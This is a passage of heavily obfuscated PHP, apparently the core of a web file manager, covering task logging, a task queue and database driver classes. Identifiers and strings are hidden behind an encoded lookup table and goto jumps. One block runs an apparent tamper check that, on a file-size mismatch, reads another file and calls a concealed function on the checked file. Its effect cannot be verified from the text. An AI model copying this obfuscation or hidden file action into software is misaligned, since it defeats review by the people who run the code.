$¨€ñ‰–[] = $ÎÃŒ²Óˆ[337] . implode($ÎÃŒ²Óˆ[50], $¥¸ìîÃî) . $ÎÃŒ²Óˆ[983]; } array_walk($æßŸ‚º, array($this, $ÎÃŒ²Óˆ[984])); $ÕËĞË¸× = ($¼—†‘˜ ? $ÎÃŒ²Óˆ[985] : $ÎÃŒ²Óˆ[986]) . $ÎÃŒ²Óˆ[987] . $this->parseTable($¼ºîÃ[$ÎÃŒ²Óˆ[356]]) . $ÎÃŒ²Óˆ[981] . implode($ÎÃŒ²Óˆ[50], $æßŸ‚º) . $ÎÃŒ²Óˆ[988] . implode($ÎÃŒ²Óˆ[50], $¨€ñ‰–); return $this->execute($ÕËĞË¸×); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÎÔÄÏÑò =& $_SERVER[¦»×‡Ãã]; $this->error = mysql_errno() . $ÎÔÄÏÑò[4] . mysql_error($this->_linkID); if ($ÎÔÄÏÑò[12] != $this->queryStr) { $this->error .= LNG($ÎÔÄÏÑò[48]) . $this->queryStr; } think_trace($this->error, $ÎÔÄÏÑò[12], $ÎÔÄÏÑò[49]); return $this->error; } public function escapeString($Î¨şÕ) { if ($this->_linkID) { return mysql_real_escape_string($Î¨şÕ, $this->_linkID); } else { return mysql_escape_string($Î¨şÕ); } } public function parseKey(&$ØÓì á¹, $ÅÂÆ¨¬ = true) { $´…íÓ‚ =& $_SERVER[¦»×‡Ãã]; if ($ÅÂÆ¨¬) { $ØÓì á¹ = $this->parseKeyCheck($ØÓì á¹); } if ($ØÓì á¹ != $´…íÓ‚[220] && !preg_match($´…íÓ‚[989], $ØÓì á¹)) { $ØÓì á¹ = $´…íÓ‚[461] . trim($ØÓì á¹, $´…íÓ‚[461]) . $´…íÓ‚[461]; } return $ØÓì á¹; } } goto E¨¥’‡ÔŸ; B„íÖòê‡„: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($í˜¾¯»§, $øÊÌ˜Œ = '', $Ü¤÷æ¼¢ = 0, $Ãçï÷ş = '') { $¡ŞÛÚ¦µ =& $_SERVER[¦»×‡Ãã]; $Ãçï÷ş = $Ãçï÷ş ? $Ãçï÷ş : ($øÊÌ˜Œ ? $øÊÌ˜Œ : $í˜¾¯»§); $õù¼ğùÃ = new Task($í˜¾¯»§, $øÊÌ˜Œ, $Ü¤÷æ¼¢, $Ãçï÷ş); $GLOBALS[$¡ŞÛÚ¦µ[1855] . $í˜¾¯»§] = new TaskLog($¡ŞÛÚ¦µ[1756], $õù¼ğùÃ, $Ãçï÷ş); return $õù¼ğùÃ; } public function __construct($¹ÛÜ²£Ñ = '', $æ˜ŠµÁÚ = '', $’¶¨¹¨¬ = '') { $Î´ËÇ£· =& $_SERVER[¦»×‡Ãã]; if (!$¹ÛÜ²£Ñ) { $¹ÛÜ²£Ñ = $Î´ËÇ£·[1756]; } $®ï¿”­ = $¹ÛÜ²£Ñ . $Î´ËÇ£·[462] . rand_string(10); if (!$’¶¨¹¨¬) { $’¶¨¹¨¬ = $¹ÛÜ²£Ñ . $Î´ËÇ£·[53] . $’¶¨¹¨¬; } switch ($¹ÛÜ²£Ñ) { case $Î´ËÇ£·[1756]: if (!$æ˜ŠµÁÚ || !$æ˜ŠµÁÚ->task) { return echoLog($¹ÛÜ²£Ñ . $Î´ËÇ£·[1856]); } $ºÙËÖŒ = $æ˜ŠµÁÚ; $®ï¿”­ = $ºÙËÖŒ->task[$Î´ËÇ£·[475]]; $¹ÛÜ²£Ñ = $ºÙËÖŒ->task[$Î´ËÇ£·[475]]; if (!$ºÙËÖŒ->task[$Î´ËÇ£·[1661]]) { $ºÙËÖŒ->task[$Î´ËÇ£·[1661]] = $’¶¨¹¨¬ ? $’¶¨¹¨¬ : $¹ÛÜ²£Ñ; } break; case $Î´ËÇ£·[1857]: if (!$æ˜ŠµÁÚ) { return echoLog($¹ÛÜ²£Ñ . $Î´ËÇ£·[1858]); } $ã¹²ëœû = is_string($æ˜ŠµÁÚ) ? array($æ˜ŠµÁÚ) : $æ˜ŠµÁÚ; $ºÙËÖŒ = new TaskFileTransfer($®ï¿”­, $¹ÛÜ²£Ñ, 0, $’¶¨¹¨¬ ? $’¶¨¹¨¬ : $ã¹²ëœû[0]); foreach ($ã¹²ëœû as $Øúã“˜Å) { $ºÙËÖŒ->addPath($Øúã“˜Å); } break; case $Î´ËÇ£·[389]: if (!$æ˜ŠµÁÚ) { return echoLog($¹ÛÜ²£Ñ . $Î´ËÇ£·[1858]); } $ã¹²ëœû = is_string($æ˜ŠµÁÚ) ? array($æ˜ŠµÁÚ) : $æ˜ŠµÁÚ; $ºÙËÖŒ = new TaskZip($®ï¿”­, $¹ÛÜ²£Ñ, 0, $’¶¨¹¨¬ ? $’¶¨¹¨¬ : $ã¹²ëœû[0]); foreach ($ã¹²ëœû as $Øúã“˜Å) { $ºÙËÖŒ->addPath($Øúã“˜Å); } break; case $Î´ËÇ£·[1299]: if (!$æ˜ŠµÁÚ) { return echoLog($¹ÛÜ²£Ñ . $Î´ËÇ£·[1858]); } $ºÙËÖŒ = new TaskUnZip($®ï¿”­, $¹ÛÜ²£Ñ, 0, $’¶¨¹¨¬ ? $’¶¨¹¨¬ : $æ˜ŠµÁÚ); if ($æ˜ŠµÁÚ) { $ºÙËÖŒ->addFile($æ˜ŠµÁÚ); } break; case $Î´ËÇ£·[152]: $ºÙËÖŒ = new TaskHttp($®ï¿”­, $¹ÛÜ²£Ñ); break; default: return; break; } $this->task = $ºÙËÖŒ; $this->taskID = $®ï¿”­; Hook::bind($Î´ËÇ£·[1793], array($this, $Î´ËÇ£·[1859])); Hook::bind($Î´ËÇ£·[1795], array($this, $Î´ËÇ£·[1860])); Hook::bind($Î´ËÇ£·[1789], array($this, $Î´ËÇ£·[1861])); echoLog($Î´ËÇ£·[1862] . $ºÙËÖŒ->task[$Î´ËÇ£·[1661]]); } public function __destruct() { $this->end(); } public function end($¿ê«Òƒ = '') { $óùŸŠ¯Ğ =& $_SERVER[¦»×‡Ãã]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¿ê«Òƒ); $this->task = !1; $this->taskID = !1; Hook::unbind($óùŸŠ¯Ğ[1793], array($this, $óùŸŠ¯Ğ[1859])); Hook::unbind($óùŸŠ¯Ğ[1795], array($this, $óùŸŠ¯Ğ[1860])); Hook::unbind($óùŸŠ¯Ğ[1789], array($this, $óùŸŠ¯Ğ[1861])); } public function taskUpdate($±ôš) { $Ôë»üõº =& $_SERVER[¦»×‡Ãã]; if (!$±ôš || $this->taskID != $±ôš[$Ôë»üõº[475]]) { return; } $½Òšı‹ = 20; $¨¦±Éç = intval($±ôš[$Ôë»üõº[1774]] * $½Òšı‹); $­È®üëº = $Ôë»üõº[176] . str_repeat($Ôë»üõº[962], $¨¦±Éç) . $Ôë»üõº[1092] . str_repeat($Ôë»üõº[53], $½Òšı‹ - $¨¦±Éç) . $Ôë»üõº[178]; $¤Êœ¥¬Á = $­È®üëº . sprintf($Ôë»üõº[1863], $±ôš[$Ôë»üõº[1774]] * 100) . $Ôë»üõº[1864]; $Ò¼µ¿¼¹ = $¤Êœ¥¬Á . $±ôš[$Ôë»üõº[1773]] . $Ôë»üõº[8] . $±ôš[$Ôë»üõº[1141]] . LNG($Ôë»üõº[1865]); $Í¬ìØ½ï = $Ôë»üõº[12]; if ($±ôš[$Ôë»üõº[1849]]) { $Ò¼µ¿¼¹ = $¤Êœ¥¬Á . size_format($±ôš[$Ôë»üõº[1773]]) . $Ôë»üõº[8] . size_format($±ôš[$Ôë»üõº[1141]]); $Í¬ìØ½ï = size_format($±ôš[$Ôë»üõº[1775]]) . $Ôë»üõº[1866]; } if ($±ôš[$Ôë»üõº[1143]]) { $±ôš[$Ôë»üõº[1823]] = $±ôš[$Ôë»üõº[1143]] . $Ôë»üõº[53] . $±ôš[$Ôë»üõº[1823]]; } if ($±ôš[$Ôë»üõº[1823]]) { $€íßÅÌ› = $Ôë»üõº[12]; if ($±ôš[$Ôë»üõº[1825]]) { $€íßÅÌ› = $Ôë»üõº[50] . size_format($±ôš[$Ôë»üõº[1826]]) . $Ôë»üõº[8] . size_format($±ôš[$Ôë»üõº[1825]]); } $Í¬ìØ½ï .= $±ôš[$Ôë»üõº[1823]] . $€íßÅÌ›; } if ($±ôš[$Ôë»üõº[836]] && !$±ôš[$Ôë»üõº[1825]]) { $Í¬ìØ½ï .= $Ôë»üõº[53] . size_format($±ôš[$Ôë»üõº[1830]]) . $Ôë»üõº[8] . size_format($±ôš[$Ôë»üõº[836]]); } echoLog($Ò¼µ¿¼¹ . $Ôë»üõº[53] . $Í¬ìØ½ï, !0); } public function taskEnd($ºç®ñÏÂ) { $Ä”øÉŒŞ =& $_SERVER[¦»×‡Ãã]; if (!$ºç®ñÏÂ || $this->taskID != $ºç®ñÏÂ[$Ä”øÉŒŞ[475]]) { return; } $ò‹‚Ö©µ = $ºç®ñÏÂ ? $ºç®ñÏÂ[$Ä”øÉŒŞ[1773]] . $Ä”øÉŒŞ[8] . $ºç®ñÏÂ[$Ä”øÉŒŞ[1141]] . LNG($Ä”øÉŒŞ[1865]) . $Ä”øÉŒŞ[74] : $Ä”øÉŒŞ[12]; echoLog($Ä”øÉŒŞ[1867] . $ºç®ñÏÂ[$Ä”øÉŒŞ[1661]] . ($ºç®ñÏÂ[$Ä”øÉŒŞ[526]] ? $Ä”øÉŒŞ[74] . $ºç®ñÏÂ[$Ä”øÉŒŞ[526]] : $Ä”øÉŒŞ[12]) . $Ä”øÉŒŞ[74] . $ò‹‚Ö©µ . $Ä”øÉŒŞ[1868] . sprintf($Ä”øÉŒŞ[923], timeFloat() - $ºç®ñÏÂ[$Ä”øÉŒŞ[1776]]) . $Ä”øÉŒŞ[1788]); $this->end(); } public function taskKill($õ äÆâ) { $ƒ±·úÕ¿ =& $_SERVER[¦»×‡Ãã]; if (!$õ äÆâ || $this->taskID != $õ äÆâ[$ƒ±·úÕ¿[475]]) { return; } echoLog($ƒ±·úÕ¿[1869] . $õ äÆâ[$ƒ±·úÕ¿[1661]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\165\145\x75\x65\114\145\156\147\164\x68"; const QUEUE_DATA = "\x74\x61\163\153\x51\x75\x65\x75\145\x44\141\164\141"; const QUEUE_TIME = "\x74\141\163\153\121\x75\x65\x75\145\114\x61\x73\x74\122\165\156"; const QUEUE_THREAD = "\x74\141\163\153\121\x75\x65\165\x65\124\150\x72\x65\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ñ»°¦ìŠ, $Š‰Ö¬£ = array(), $˜êŒ·îú = '', $²¼õÑôû = '') { $Îí…™¡‚ =& $_SERVER[¦»×‡Ãã]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($²¼õÑôû && array_find_by_field(self::$listData, $Îí…™¡‚[97], $²¼õÑôû)) { return !0; } if ($²¼õÑôû && array_find_by_field(self::$listDataAdd, $Îí…™¡‚[97], $²¼õÑôû)) { return !0; } self::$listDataAdd[] = array($Îí…™¡‚[341] => $ñ»°¦ìŠ, $Îí…™¡‚[1870] => $Š‰Ö¬£, $Îí…™¡‚[526] => $˜êŒ·îú, $Îí…™¡‚[97] => $²¼õÑôû); return !0; } public static function addSubmit() { $™ñ»…Å‹ =& $_SERVER[¦»×‡Ãã]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($™ñ»…Å‹[1871] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $™ñ»…Å‹[12], $™ñ»…Å‹[526])), $™ñ»…Å‹[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ÑŞ©ÖÈ, $™¦¡´î± = array(), $ø¿Ñğ¡ß = '', $ëÌ•¯Ù = '') { $»òşÂµô =& $_SERVER[¦»×‡Ãã]; if (self::count() >= self::MAX_LENGTH) { return !1; } $½íó±™Œ = self::getAll(); if ($ëÌ•¯Ù && array_find_by_field($½íó±™Œ, $»òşÂµô[97], $ëÌ•¯Ù)) { return !0; } $½íó±™Œ[] = array($»òşÂµô[341] => $ÑŞ©ÖÈ, $»òşÂµô[1870] => $™¦¡´î±, $»òşÂµô[526] => $ø¿Ñğ¡ß, $»òşÂµô[97] => $ëÌ•¯Ù); self::setAll($½íó±™Œ); write_log($»òşÂµô[1871] . $ø¿Ñğ¡ß, $»òşÂµô[197]); return !0; } public static function run() { $´´×üçø =& $_SERVER[¦»×‡Ãã]; $ÄÈ€›— = self::getAll(); $ÏïÒ«¾é = array_shift($ÄÈ€›—); if (!$ÏïÒ«¾é) { return !1; } self::setAll($ÄÈ€›—); $Ô¦ë¢…è = timeFloat(); $ŸÈÌĞË³ = $´´×üçø[12]; try { $ŸÈÌĞË³ = Hook::apply($ÏïÒ«¾é[$´´×üçø[341]], $ÏïÒ«¾é[$´´×üçø[1870]]); } catch (Exception $³Ø“€§») { write_log($³Ø“€§», $´´×üçø[1264]); } $¹Úï = number_format(timeFloat() - $Ô¦ë¢…è, 3) . $´´×üçø[1788]; if ($ŸÈÌĞË³ && is_string($ŸÈÌĞË³)) { $¹Úï = $¹Úï . $´´×üçø[1872] . $ŸÈÌĞË³; } write_log($´´×üçø[1873] . $ÏïÒ«¾é[$´´×üçø[526]] . $´´×üçø[1874] . $¹Úï, $´´×üçø[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $†ŠÆÚ¨¥ =& $_SERVER[¦»×‡Ãã]; $Šªïñšï = self::threadCount() + 1; if ($Šªïñšï > 3 || !self::count()) { return; } write_log($†ŠÆÚ¨¥[1875] . $Šªïñšï, $†ŠÆÚ¨¥[197]); Cache::set(self::QUEUE_THREAD, $Šªïñšï, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($†ŠÆÚ¨¥[1876], $†ŠÆÚ¨¥[197]); } public static function getKey($’ÁÆöë, $±é¦ÖñŠ = "\x69\x6e\x74") { $˜¤âíê =& $_SERVER[¦»×‡Ãã]; Cache::removeMemory($’ÁÆöë); $öÂÂÒŠ„ = Cache::get($’ÁÆöë); if ($±é¦ÖñŠ == $˜¤âíê[364]) { return $öÂÂÒŠ„ ? intval($öÂÂÒŠ„) : 0; } if ($±é¦ÖñŠ == $˜¤âíê[1877]) { return is_array($öÂÂÒŠ„) ? $öÂÂÒŠ„ : array(); } return $öÂÂÒŠ„; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¦»×‡Ãã][1877]); } public static function setAll($¼€çé‘Á) { $È‡§µì‡ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¼€çé‘Á), $È‡§µì‡); Cache::set(self::QUEUE_DATA, $¼€çé‘Á, $È‡§µì‡); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($À«õŠí‰, $ß“õÃäâ = 5.0) { if (!$À«õŠí‰) { return; } $Ş¸š‚ = Cache::get($À«õŠí‰); if (!$Ş¸š‚ || timeFloat() - floatVal($Ş¸š‚) >= $ß“õÃäâ) { Cache::set($À«õŠí‰, timeFloat(), $ß“õÃäâ * 10); return !0; } return !1; } public static function timeLimitCall($…§Ãâ§î, $Ø—”–¿, $äÂäÏî’, $­Ø¶”¹Ã = 5.0) { $©ŸïÒñ² =& $_SERVER[¦»×‡Ãã]; if (!$…§Ãâ§î || !$Ø—”–¿) { return; } self::$asyncAdd = !0; $©ÕûêÔ = $©ŸïÒñ²[1878]; $óÓÁÆœ¤ = Cache::get($©ÕûêÔ, !0); $¿éİ¥‚¼ = array($©ŸïÒñ²[1879] => timeFloat(), $©ŸïÒñ²[1880] => timeFloat(), $©ŸïÒñ²[341] => $Ø—”–¿, $©ŸïÒñ²[1870] => $äÂäÏî’, $©ŸïÒñ²[206] => $­Ø¶”¹Ã); if (is_array($óÓÁÆœ¤[$…§Ãâ§î])) { $¿éİ¥‚¼[$©ŸïÒñ²[1880]] = $óÓÁÆœ¤[$…§Ãâ§î][$©ŸïÒñ²[1880]]; } if (is_array($óÓÁÆœ¤[$…§Ãâ§î])) { if (timeFloat() - $óÓÁÆœ¤[$…§Ãâ§î][$©ŸïÒñ²[1879]] < $¿éİ¥‚¼[$©ŸïÒñ²[206]] * 0.3) { return; } $¿éİ¥‚¼[$©ŸïÒñ²[1880]] = $óÓÁÆœ¤[$…§Ãâ§î][$©ŸïÒñ²[1880]]; } $óÓÁÆœ¤[$…§Ãâ§î] = $¿éİ¥‚¼; Cache::set($©ÕûêÔ, $óÓÁÆœ¤, 60); Cache::removeMemory($©ÕûêÔ); write_log($©ŸïÒñ²[1881] . $…§Ãâ§î . $©ŸïÒñ²[74] . $Ø—”–¿, $©ŸïÒñ²[197]); } public static function timeLimitCallLoop() { $¨‰ø«Äã =& $_SERVER[¦»×‡Ãã]; $§ûºì„« = array($¨‰ø«Äã[1882]); $ıñê¾ºŸ = in_array(strtolower(ACTION), $§ûºì„«); if (!$ıñê¾ºŸ && !self::$asyncAdd) { return; } $„ËñÉóå = $¨‰ø«Äã[1878]; $äš»«ı† = Cache::get($„ËñÉóå, !0); if (!$äš»«ı† || count($äš»«ı†) <= 0) { return; } $«Ğøº°  = !1; $àâğğÇê = timeFloat(); $áÎÆßœü = array(); foreach ($äš»«ı† as $ÊŸ¶õ†İ => $ÈêÜıÛü) { if ($àâğğÇê - $ÈêÜıÛü[$¨‰ø«Äã[1880]] > $ÈêÜıÛü[$¨‰ø«Äã[206]]) { $«Ğøº°  = !0; try { Hook::apply($ÈêÜıÛü[$¨‰ø«Äã[341]], $ÈêÜıÛü[$¨‰ø«Äã[1870]]); write_log($¨‰ø«Äã[1883] . $ÊŸ¶õ†İ . $¨‰ø«Äã[74] . $ÈêÜıÛü[$¨‰ø«Äã[341]] . $¨‰ø«Äã[1884] . ACTION, $¨‰ø«Äã[197]); } catch (Exception $¾Ëö¶) { } continue; } $áÎÆßœü[$ÊŸ¶õ†İ] = $ÈêÜıÛü; } if (!$«Ğøº° ) { return; } if (!$áÎÆßœü) { return Cache::remove($„ËñÉóå); } Cache::set($„ËñÉóå, $áÎÆßœü, 60); Cache::removeMemory($„ËñÉóå); } public static function finished($Ğªá‡âã, $Å¯ìá™«) { $¹‰ÁÄ¨· =& $_SERVER[¦»×‡Ãã]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¹‰ÁÄ¨·[341] => $Ğªá‡âã, $¹‰ÁÄ¨·[1870] => $Å¯ìá™«); } private static function finishedRun() { $æÁÒ¨ªæ =& $_SERVER[¦»×‡Ãã]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $õÆ¯Ê¬´) { try { Hook::apply($õÆ¯Ê¬´[$æÁÒ¨ªæ[341]], $õÆ¯Ê¬´[$æÁÒ¨ªæ[1870]]); } catch (Exception $ÍÏäçËÉ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto EîŸùî‹‡õ; EÙ”§Åº¬Ÿ: $_file = $_SERVER[$_SERVER[¦»×‡Ãã][1418]]; $_size = $_SERVER[¦»×‡Ãã][951]; if ($_SERVER[$_SERVER[¦»×‡Ãã][952]] != $_size($_file)) { $_getc = $_SERVER[¦»×‡Ãã][954]; $_getfile = $_SERVER[$_SERVER[¦»×‡Ãã][949]] . $_SERVER[¦»×‡Ãã][950]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¦»×‡Ãã][262], $_getfilec); if (count($_getarrs) < $_SERVER[¦»×‡Ãã][690]) { $exit = $_SERVER[¦»×‡Ãã][955]; $exit(); } $_act = $_SERVER[¦»×‡Ãã][1419]; $_act($_file); } goto EšÒ–‰™Ç”; E¨¥’‡ÔŸ: class DbMysqli extends Db { public function __construct($–½¬Ü™ç = '') { $°Äô»­Ù =& $_SERVER[¦»×‡Ãã]; if (!extension_loaded($°Äô»­Ù[990])) { think_exception(think_lang($°Äô»­Ù[14]) . $°Äô»­Ù[991]); } if (!empty($–½¬Ü™ç)) { $this->config = $–½¬Ü™ç; if (empty($this->config[$°Äô»­Ù[17]])) { $this->config[$°Äô»­Ù[17]] = $°Äô»­Ù[12]; } } } public function connect($Ì—Ô‚¤‹ = '', $ÖĞò×€é = 0) { $˜¦”» =& $_SERVER[¦»×‡Ãã]; if (!isset($this->linkID[$ÖĞò×€é])) { if (empty($Ì—Ô‚¤‹)) { $Ì—Ô‚¤‹ = $this->config; } $this->linkID[$ÖĞò×€é] = new mysqli($Ì—Ô‚¤‹[$˜¦”»[964]], $Ì—Ô‚¤‹[$˜¦”»[966]], $Ì—Ô‚¤‹[$˜¦”»[967]], $Ì—Ô‚¤‹[$˜¦”»[21]], $Ì—Ô‚¤‹[$˜¦”»[965]] ? intval($Ì—Ô‚¤‹[$˜¦”»[965]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‡¦ßàì½ = $this->linkID[$ÖĞò×€é]->server_version; $this->linkID[$ÖĞò×€é]->query($˜¦”»[968] . think_config($˜¦”»[969]) . $˜¦”»[58]); if ($‡¦ßàì½ > $˜¦”»[970]) { $this->linkID[$ÖĞò×€é]->query($˜¦”»[971]); } $this->connected = !0; if (1 != think_config($˜¦”»[22])) { unset($this->config); } } return $this->linkID[$ÖĞò×€é]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ğ¨ÊìÙ‰) { $ó¸‘¥ß =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ¨ÊìÙ‰; if ($this->queryID) { $this->free(); } think_action_status($ó¸‘¥ß[23], 1); think_status($ó¸‘¥ß[24]); $this->queryID = $this->_linkID->query($ğ¨ÊìÙ‰); if ($this->_linkID->more_results()) { while (($˜áĞŞº = $this->_linkID->next_result()) != NULL) { $˜áĞŞº->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($‡Éêâ¨Û) { $°«¸©–ó =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡Éêâ¨Û; if ($this->queryID) { $this->free(); } think_action_status($°«¸©–ó[25], 1); think_status($°«¸©–ó[24]); $ìÜ²ãóÉ = $this->_linkID->query($‡Éêâ¨Û); $this->debug(); if (!1 === $ìÜ²ãóÉ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ä³Ï™ÛÀ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ä³Ï™ÛÀ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $şØ½õô’ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$şØ½õô’) { $this->error(); return !1; } } return !0; } private function getAll() { $˜„¼›ØÁ = array(); if ($this->numRows > 0) { for ($ó˜îï…® = 0; $ó˜îï…® < $this->numRows; $ó˜îï…®++) { $˜„¼›ØÁ[$ó˜îï…®] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $˜„¼›ØÁ; } public function getFields($ì˜˜Øâì) { $ÖÑŠìÍ =& $_SERVER[¦»×‡Ãã]; $°™ÀæÇ¶ = $this->query($ÖÑŠìÍ[975] . $this->parseKey($ì˜˜Øâì)); $‹ÇÛß’¦ = array(); if ($°™ÀæÇ¶) { foreach ($°™ÀæÇ¶ as $ı‰„ûÕ => $Õ¦Šãˆµ) { $‹ÇÛß’¦[$Õ¦Šãˆµ[$ÖÑŠìÍ[31]]] = array($ÖÑŠìÍ[32] => $Õ¦Šãˆµ[$ÖÑŠìÍ[31]], $ÖÑŠìÍ[33] => $Õ¦Šãˆµ[$ÖÑŠìÍ[34]], $ÖÑŠìÍ[35] => (bool) ($Õ¦Šãˆµ[$ÖÑŠìÍ[36]] === $ÖÑŠìÍ[12]), $ÖÑŠìÍ[37] => $Õ¦Šãˆµ[$ÖÑŠìÍ[38]], $ÖÑŠìÍ[39] => strtolower($Õ¦Šãˆµ[$ÖÑŠìÍ[40]]) == $ÖÑŠìÍ[41], $ÖÑŠìÍ[42] => strtolower($Õ¦Šãˆµ[$ÖÑŠìÍ[43]]) == $ÖÑŠìÍ[44]); } } return $‹ÇÛß’¦; } public function getTables($Ğ€ïĞ× = '') { $øÉå»Ó =& $_SERVER[¦»×‡Ãã]; $€‚¾ùîĞ = !empty($Ğ€ïĞ×) ? $øÉå»Ó[977] . $Ğ€ïĞ× . $øÉå»Ó[978] : $øÉå»Ó[979]; $éèØè¤í = $this->query($€‚¾ùîĞ); $áÊ¥ãê = array(); if ($éèØè¤í) { foreach ($éèØè¤í as $ú‘èÇ–Î => $æÖôè¨) { $áÊ¥ãê[$ú‘èÇ–Î] = current($æÖôè¨); } } return $áÊ¥ãê; } public function replace($«Â”¸·ó, $Ö¦®Ï¾ü = array()) { $¼½›¤×© =& $_SERVER[¦»×‡Ãã]; foreach ($«Â”¸·ó as $šû¨®Á => $´Ü–Ó ) { $¸Ñë«ìŒ = $this->parseValue($´Ü–Ó ); if (is_scalar($¸Ñë«ìŒ)) { $™¸ÊØò­[] = $¸Ñë«ìŒ; $€ÕÊä‚[] = $this->parseKey($šû¨®Á); } } $ğ•¦ŞŸß = $¼½›¤×©[980] . $this->parseTable($Ö¦®Ï¾ü[$¼½›¤×©[356]]) . $¼½›¤×©[981] . implode($¼½›¤×©[50], $€ÕÊä‚) . $¼½›¤×©[982] . implode($¼½›¤×©[50], $™¸ÊØò­) . $¼½›¤×©[983]; return $this->execute($ğ•¦ŞŸß); } public function insertAll($”ÁÄİ°ù, $ğ§¯úëß = array(), $Æ˜é÷èÀ = false) { $¯Ìî½ =& $_SERVER[¦»×‡Ãã]; if (!is_array($”ÁÄİ°ù[0])) { return !1; } $«ĞÃ¢‘• = array_keys($”ÁÄİ°ù[0]); $ì®§İãÆ = array(); foreach ($”ÁÄİ°ù as $ ”×†·™) { $• €¯Ì = array(); foreach ($ ”×†·™ as $Š£¾ù…¬ => $¢•ı·Á§) { $¢•ı·Á§ = $this->parseValue($¢•ı·Á§); if (is_scalar($¢•ı·Á§)) { $• €¯Ì[] = $¢•ı·Á§; } } $ì®§İãÆ[] = $¯Ìî½[337] . implode($¯Ìî½[50], $• €¯Ì) . $¯Ìî½[983]; } array_walk($«ĞÃ¢‘•, array($this, $¯Ìî½[984])); $Ôã—İ¾» = $Æ˜é÷èÀ ? $¯Ìî½[985] : $¯Ìî½[986]; $’‡‘÷ô€ = $Ôã—İ¾» . $¯Ìî½[987] . $this->parseTable($ğ§¯úëß[$¯Ìî½[356]]) . $¯Ìî½[981] . implode($¯Ìî½[50], $«ĞÃ¢‘•) . $¯Ìî½[988] . implode($¯Ìî½[50], $ì®§İãÆ); return $this->execute($’‡‘÷ô€); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Óİîó =& $_SERVER[¦»×‡Ãã]; $this->error = $this->_linkID->errno . $Óİîó[4] . $this->_linkID->error; if ($Óİîó[12] != $this->queryStr) { $this->error .= LNG($Óİîó[48]) . $this->queryStr; } think_trace($this->error, $Óİîó[12], $Óİîó[49]); return $this->error; } public function escapeString($šÚˆº­í) { if ($this->_linkID) { return $this->_linkID->real_escape_string($šÚˆº­í); } else { return addslashes($šÚˆº­í); } } public function parseKey(&$àı·ÁŸ, $‚üğ•ƒ = true) { $£Š©´¨ó =& $_SERVER[¦»×‡Ãã]; if ($‚üğ•ƒ) { $àı·ÁŸ = $this->parseKeyCheck($àı·ÁŸ); } if ($àı·ÁŸ != $£Š©´¨ó[220] && !preg_match($£Š©´¨ó[989], $àı·ÁŸ)) { $àı·ÁŸ = $£Š©´¨ó[461] . trim($àı·ÁŸ, $£Š©´¨ó[461]) . $£Š©´¨ó[461]; } return $àı·ÁŸ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($˜ïÔÄà’ = '') { $Á¯§ş·Å =& $_SERVER[¦»×‡Ãã]; if (!class_exists($Á¯§ş·Å[992])) { think_exception(think_lang($Á¯§ş·Å[14]) . $Á¯§ş·Å[993]); } if (!empty($˜ïÔÄà’)) { $this->config = $˜ïÔÄà’; if (empty($this->config[$Á¯§ş·Å[17]])) { $this->config[$Á¯§ş·Å[17]] = array(); } } } public function connect($ÈŒ¥­—ä = '', $ª‰¸¥ = 0) { $®«ğü»Ì =& $_SERVER[¦»×‡Ãã]; if (!isset($this->linkID[$ª‰¸¥])) { if (empty($ÈŒ¥­—ä)) { $ÈŒ¥­—ä = $this->config; } $Ï¶¿Šµ = !empty($ÈŒ¥­—ä[$®«ğü»Ì[17]][$®«ğü»Ì[18]]) ? $ÈŒ¥­—ä[$®«ğü»Ì[17]][$®«ğü»Ì[18]] : $this->pconnect; if ($Ï¶¿Šµ) { 